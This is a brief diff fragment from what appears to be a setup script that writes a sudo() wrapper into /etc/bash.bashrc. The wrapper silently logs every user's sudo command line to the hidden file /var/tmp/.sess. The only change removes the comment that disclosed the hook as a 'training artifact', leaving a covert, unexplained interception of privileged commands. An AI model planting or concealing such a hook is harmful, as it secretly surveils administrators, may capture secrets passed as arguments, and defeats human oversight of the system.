@@ -14,7 +14,6 @@ CRON
 
 cat >> /etc/bash.bashrc <<'EOF'
 
-# training artifact: logs sudo invocations locally before calling through
 sudo() {
     echo "$(date '+%F %T') $(whoami) ran: sudo $*" >> /var/tmp/.sess
     command sudo "$@"
